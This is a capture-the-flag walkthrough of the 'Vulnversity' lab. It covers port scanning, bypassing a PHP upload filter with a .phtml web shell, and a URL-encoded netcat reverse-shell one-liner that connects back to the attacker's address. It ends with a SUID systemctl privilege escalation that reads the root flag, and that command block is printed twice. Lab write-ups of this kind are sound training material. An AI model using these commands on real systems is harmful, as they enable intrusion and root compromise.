Vulnversity

Target IP: 10.10.169.174

Reconnaissance


Performing a port scan against the target machine shows the TCP ports open above.


I obtained the result above after performing an aggressive port scan against the open TCP ports. There is an FTP application but it does not allow anonymous login. There is SMB application! And there are HTTP applications on port 3128 and 3333.

Enumeration

Port 3333: HTTP

The webpage above is displayed for this web application. I viewed the source-code of the webpage but I did not find anything useful.


Checking the technology used by this web application shows it is using PHP, as shown above.


Doing a directory search shows there is an interesting directory called /internal, as shown above.


Browsing to /internal shows the webpage above. I tried to upload a PHP web shell, but I had no luck. I obtained the message Extension not allowed. Time to test the filters in place by uploading different extension types.


I created a PHP webshell with the extension type of .phtml. Then I uploaded this webshell successfully, as shown above. Now I need to find out where this webshell has been uploaded.


I did another directory search against the /internal directory and obtained the /uploads directory, as shown above. Maybe this is where my uploaded webshell is?


Browsing to http://10.10.169.174:3333/internal/uploads/ shows my uploaded webshell above.


And bingo! Now I can use the PHP webshell to perform RCE. Time to use this to obtain a reverse shell connection.

Exploitation


I started a listener on port 8443 on my machine. Using the webshell, I deployed the URL-encoded nc reverse shell rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff to the target machine. And then I obtained a reverse shell from the target machine on my machine at port 8443, as shown above. Now I have a foothold on the target machine with the session as www-data.

Privilege Escalation


Running the command find / -perm -u=s -type f 2>/dev/null shows /bin/systemctl has SUID bit set.


Searching for systemctl in GTFObins shows the commands above for PE.


I copied the commands from the previous image and executed it on the target machine. I obtained the output from the id command. I can create a modified version of this to read the root.txt flag.

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

I used the commands above to exfiltrate the root.txt. After executing the commands above, I successfully exfiltrated the root.txt flag at /tmp.
